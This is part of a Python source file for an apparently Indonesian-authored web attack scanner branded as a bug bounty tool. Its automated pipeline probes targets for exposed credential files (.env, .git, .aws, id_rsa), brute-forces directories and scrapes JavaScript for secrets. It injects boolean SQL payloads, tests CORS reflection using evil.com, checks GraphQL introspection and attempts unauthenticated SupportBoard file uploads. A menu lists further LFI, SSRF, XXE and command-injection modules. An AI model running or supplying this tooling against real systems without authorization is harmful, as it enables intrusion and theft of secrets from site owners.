    REPORT["artifacts"]["ports"] = open_ports

    # ── 4. WAF + Headers ─────────────────────────────────
    _banner_step(4, TOTAL, "WAF + Security Headers")
    r = safe_get(full)
    if r:
        hdrs_lower = {k.lower():v for k,v in r.headers.items()}
        combined = "\n".join(f"{k}: {v}" for k,v in hdrs_lower.items()) + r.text.lower()
        wafs = [w for w,sigs in WAF_SIGNATURES.items() if any(s in combined for s in sigs)]
        if wafs: log(f"→ WAF: {wafs}","warn")
        REPORT["artifacts"]["waf"] = wafs
        missing = [h for h in SECURITY_HEADERS if h.lower() not in hdrs_lower]
        if missing:
            add_finding("low","headers",f"Missing {len(missing)} security headers",
                        ", ".join(missing), full)

    # ── 5. Fingerprint ────────────────────────────────────
    _banner_step(5, TOTAL, "Fingerprint")
    if r:
        body = r.text.lower()
        combined2 = body + "\n" + "\n".join(f"{k}: {v}" for k,v in r.headers.items()).lower()
        techs = [t for t,sigs in {
            "WordPress":["wp-content"],"Laravel":["laravel"],
            "Django":["csrftoken"],"Rails":["rails"],"ASP.NET":["asp.net"],
            "PHP":["phpsessid"],"Nginx":["server: nginx"],"Apache":["server: apache"],
            "Cloudflare":["cf-ray"],"React":["react"],"Vue":["vue"],"Next.js":["__next"],
        }.items() if any(n in combined2 for n in sigs)]
        log(f"→ Tech: {techs or ['(unknown)']}","ok")
        REPORT["artifacts"]["tech"] = techs

    # ── 6. Sensitive files ────────────────────────────────
    _banner_step(6, TOTAL, "Sensitive File Probe")
    def _ps(path):
        try:
            rr = requests.get(f"{full.rstrip('/')}/{path}", headers=req_headers(),
                              timeout=8, verify=False, allow_redirects=False, proxies=proxies())
            if rr.status_code == 200 and len(rr.content) > 10:
                return path, rr.status_code, len(rr.content)
        except Exception: pass
        return None
    sens_hits = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for res in ex.map(_ps, SENSITIVE_PATHS):
            if res:
                sens_hits.append(res)
                print(f"  {Fore.RED}[HIT]{Style.RESET_ALL} /{res[0]} [{res[1]}] {res[2]}b")
                sev = "critical" if any(k in res[0] for k in
                    [".env",".git","config",".aws","phpinfo","backup","id_rsa"]) else "medium"
                add_finding(sev,"sensitive",f"Exposed: /{res[0]}",f"{res[1]} {res[2]}b",full)
    REPORT["artifacts"]["sensitive"] = sens_hits

    # ── 7. Dir brute ──────────────────────────────────────
    _banner_step(7, TOTAL, "Directory Brute")
    def _pd(word):
        try:
            rr = requests.get(f"{full.rstrip('/')}/{word}", headers=req_headers(),
                              timeout=6, verify=False, allow_redirects=False, proxies=proxies())
            if rr.status_code in (200,301,302,401,403) and len(rr.content) > 50:
                return word, rr.status_code, len(rr.content)
        except Exception: pass
        return None
    dirs = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for res in ex.map(_pd, DIR_WORDLIST):
            if res:
                dirs.append(res)
                c = {200:Fore.GREEN,301:Fore.CYAN,302:Fore.CYAN,401:Fore.YELLOW,403:Fore.YELLOW}.get(res[1],"")
                print(f"  {c}[{res[1]}]{Style.RESET_ALL} /{res[0]}")
    REPORT["artifacts"]["dirs"] = dirs

    # ── 8. JS Secret scan ─────────────────────────────────
    _banner_step(8, TOTAL, "JS Secret Scan")
    if r:
        js_urls = {urllib.parse.urljoin(full, m.group(1))
                   for m in re.finditer(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text, re.I)}
        all_js_hits = _scan_js_text(r.text, "inline")
        for js_url in list(js_urls)[:15]:
            jr = safe_get(js_url)
            if jr: all_js_hits.extend(_scan_js_text(jr.text, js_url.split("/")[-1][:30]))
        seen = set()
        for label, val, src in all_js_hits:
            k = (label, val[:30])
            if k in seen: continue
            seen.add(k)
            print(f"  {Fore.RED}[SECRET]{Style.RESET_ALL} {label}: {val[:60]}")
            add_finding("critical","jsscan",f"Secret in JS: {label}",val[:60],full)

    # ── 9. Quick SQLi + CORS ──────────────────────────────
    _banner_step(9, TOTAL, "Quick Vuln Pass (SQLi + CORS)")
    p = urllib.parse.urlparse(full)
    if p.query:
        qs = urllib.parse.parse_qs(p.query)
        if qs:
            first = list(qs.keys())[0]; orig = qs[first][0]
            def f(v):
                nq = qs.copy(); nq[first] = [v]
                rr = safe_get(urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(nq,doseq=True))))
                return (rr.status_code, len(rr.content)) if rr else (None,0)
            tc,tl = f(f"{orig}' AND '1'='1")
            fc,fl = f(f"{orig}' AND '1'='2")
            if tc == fc and abs(tl-fl) > 30:
                add_finding("high","sqli",f"SQLi suspect on '{first}'",f"diff={abs(tl-fl)}",full)
    try:
        rc = requests.get(full, headers=req_headers({"Origin":"https://evil.com"}),
                          timeout=TIMEOUT, verify=False, proxies=proxies())
        if rc.headers.get("Access-Control-Allow-Origin") == "https://evil.com" and \
           rc.headers.get("Access-Control-Allow-Credentials","").lower() == "true":
            add_finding("high","cors","CORS reflects evil.com w/ credentials","",full)
    except Exception: pass

    # ── 10. GraphQL probe ─────────────────────────────────
    _banner_step(10, TOTAL, "GraphQL Probe")
    base = full.rstrip("/")
    for gql_path in GQL_PATHS:
        try:
            rg = requests.post(base+gql_path, data=GQL_INTRO,
                               headers=req_headers({"Content-Type":"application/json"}),
                               timeout=8, verify=False, proxies=proxies())
            if "__schema" in rg.text:
                add_finding("medium","graphql","GraphQL introspection enabled","",base+gql_path)
                log(f"  → GraphQL introspection: {base+gql_path}","warn"); break
        except Exception: pass

    # ── 11. SupportBoard check ────────────────────────────
    _banner_step(11, TOTAL, "SupportBoard Plugin Check")
    try:
        sb = _sb_scan_one(clean_host(host))
        if sb:
            if sb.get("verified"):
                add_finding("critical","supportboard","SupportBoard unauth upload",sb["url"],sb["url"])
            elif sb["upload"].get("success"):
                add_finding("high","supportboard","SupportBoard upload accepted",sb["url"],sb["url"])
            else:
                log("  SupportBoard ada tapi upload ditolak","info")
        else:
            log("  Tidak ada plugin SupportBoard","info")
    except Exception as e:
        log(f"  SupportBoard: {e}","warn")

    # ── 12. Summary + Report ──────────────────────────────
    _banner_step(12, TOTAL, "Report")
    REPORT["finished"] = datetime.now().isoformat()
    _print_summary()
    _generate_html_report()


def _print_summary():
    counts = {s:0 for s in SEV_ORDER}
    for f in REPORT["findings"]: counts[f["severity"]] += 1
    print(f"\n{Fore.YELLOW}{'═'*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  SUMMARY — {REPORT['target']}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'═'*60}{Style.RESET_ALL}")
    cols = {0:Fore.RED,1:Fore.RED,2:Fore.YELLOW,3:Fore.CYAN,4:""}
    for i,(s,c) in enumerate(counts.items()):
        print(f"  {cols[i]}{s.upper():<10}{Style.RESET_ALL} {c}")
    print(f"\n  Total: {sum(counts.values())} findings")


def _generate_html_report():
    if not REPORT.get("target"): return
    sev_color = {"critical":"#ff2d2d","high":"#ff7d00",
                 "medium":"#ffcc00","low":"#00aaff","info":"#888"}
    rows = ""
    for f in sorted(REPORT["findings"],
                    key=lambda x: SEV_ORDER.index(x["severity"])):
        c = sev_color[f["severity"]]
        rows += (f"<tr><td style='color:{c};font-weight:bold'>{f['severity'].upper()}</td>"
                 f"<td>{f['module']}</td><td>{f['title']}</td>"
                 f"<td style='font-size:11px;font-family:monospace'>{str(f['detail'])[:120]}</td>"
                 f"<td style='font-size:11px;font-family:monospace'>{f['target'] or ''}</td></tr>")
    art_html = ""
    for k, v in REPORT["artifacts"].items():
        if isinstance(v, list):
            items = "".join(f"<li>{x}</li>" for x in v[:50])
            art_html += f"<h3>{k} ({len(v)})</h3><ul>{items}</ul>"
        elif isinstance(v, dict):
            art_html += f"<h3>{k}</h3><pre>{json.dumps(v,indent=2)[:2000]}</pre>"
    fn = f"report_{clean_host(REPORT['target'])}_{int(time.time())}.html"
    doc = f"""<!doctype html><html><head><meta charset="utf-8">
<title>Report — {REPORT['target']}</title><style>
body{{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0a0e14;
  color:#c8d2dc;padding:30px;max-width:1100px;margin:auto}}
h1{{color:{Fore.RED if False else '#ff3366'};border-bottom:2px solid #ff3366;padding-bottom:10px}}
h2{{color:#00d9ff;margin-top:30px}} h3{{color:#ffaa00;font-size:14px}}
table{{width:100%;border-collapse:collapse;background:#12171f;margin:15px 0}}
th{{background:#1a212b;padding:10px;text-align:left;color:#00d9ff;border-bottom:2px solid #00d9ff}}
td{{padding:8px 10px;border-bottom:1px solid #1f2732;font-size:13px}}
tr:hover{{background:#1a212b}} pre{{background:#12171f;padding:12px;border-radius:6px;overflow:auto;font-size:12px}}
ul{{background:#12171f;padding:12px 30px;border-radius:6px}} .meta{{color:#666;font-size:12px;margin-bottom:20px}}
</style></head><body>
<h1>🔴 {TOOLS} — Bug Bounty Report</h1>
<div class="meta">
  <b>Target:</b> {REPORT['target']}<br><b>Author:</b> {AUTHOR}<br>
  <b>Started:</b> {REPORT['started']}<br><b>Finished:</b> {REPORT.get('finished','N/A')}
</div>
<h2>Findings ({len(REPORT['findings'])})</h2>
<table><tr><th>Sev</th><th>Module</th><th>Title</th><th>Detail</th><th>Target</th></tr>
{rows or '<tr><td colspan="5">No findings.</td></tr>'}</table>
<h2>Artifacts</h2>{art_html}
</body></html>"""
    try:
        Path(fn).write_text(doc, encoding="utf-8")
        log(f"Report: {fn}","ok")
    except Exception as e:
        log(f"Report fail: {e}","err")

# ═══════════════════════════════════════════════════════════
#                          MENU
# ═══════════════════════════════════════════════════════════

MENU = """
{YL}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃  {RD}★  {TOOLS}{RS}
┃  {MA}{VERSION} — by {AUTHOR}{RS}
┃
┃  {RD}[A]{RS}   AUTO RECON FULL PIPELINE
┃  {RD}[SB]{RS}  SUPPORTBOARD AUTO-DORK SCAN
┃  ─────────────────────────────────────────
┃  {GR}[1]{RS}  Dorking       {GR}[12]{RS} Takeover
┃  {GR}[2]{RS}  Subdomain     {GR}[13]{RS} Dir Brute
┃  {GR}[3]{RS}  Port Scan     {GR}[14]{RS} WAF Detect
┃  {GR}[4]{RS}  Headers       {GR}[15]{RS} SSL Info
┃  {GR}[5]{RS}  CORS          {GR}[16]{RS} HTTP Methods
┃  {GR}[6]{RS}  Open Redirect {GR}[17]{RS} JWT
┃  {GR}[7]{RS}  Wayback       {GR}[18]{RS} LFI
┃  {GR}[8]{RS}  Sensitive     {GR}[19]{RS} SSRF
┃  {GR}[9]{RS}  Fingerprint   {GR}[20]{RS} Param Fuzz
┃  {CY}[10]{RS} SQLi          {CY}[21]{RS} Robots
┃  {CY}[11]{RS} XSS           {CY}[22]{RS} IDOR
┃  {GR}[23]{RS} XXE           {GR}[24]{RS} Cmd Inject
┃  {GR}[25]{RS} JS Secrets    {GR}[26]{RS} Rate Limit
┃  {GR}[27]{RS} GraphQL       {RD}[0]{RS}  Keluar
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""

HANDLERS = {
    "a": mod_auto, "sb": mod_supportboard,
    "1": mod_dork,         "2": mod_subdomain,  "3": mod_portscan,
    "4": mod_headers,      "5": mod_cors,        "6": mod_openredirect,
    "7": mod_wayback,      "8": mod_sensitive,   "9": mod_fingerprint,
    "10": mod_sqli,        "11": mod_xss,        "12": mod_takeover,
    "13": mod_dirbrute,    "14": mod_waf,        "15": mod_ssl,
    "16": mod_methods,     "17": mod_jwt,        "18": mod_lfi,
    "19": mod_ssrf,        "20": mod_paramfuzz,  "21": mod_robots,
    "22": mod_idor,        "23": mod_xxe,        "24": mod_cmdi,
    "25": mod_jsscan,      "26": mod_ratelimit,  "27": mod_graphql,
}


def print_menu():
    clear(); print_banner()
    print(MENU.format(
        YL=Fore.YELLOW, GR=Fore.GREEN, RD=Fore.RED,
        CY=Fore.CYAN, MA=Fore.MAGENTA, RS=Style.RESET_ALL,
        TOOLS=TOOLS, VERSION=VERSION, AUTHOR=AUTHOR))


def main():
    login()
    while True:
        print_menu()
        choice = ask("Pilih").lower()
        if choice == "0":
            log("Keluar. Stay sharp.", "ok"); break
        handler = HANDLERS.get(choice)
        if not handler:
            log("Pilihan invalid","err"); time.sleep(0.5); continue
        try:
            handler()
        except KeyboardInterrupt:
            log("Dibatalkan","warn")
        except Exception as e:
            log(f"Error: {e}","err")
        try:
            input(f"\n    {Fore.CYAN}Enter untuk kembali...{Style.RESET_ALL}")
        except (KeyboardInterrupt, EOFError):
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(); log("Dibatalkan","warn"); sys.exit(0)
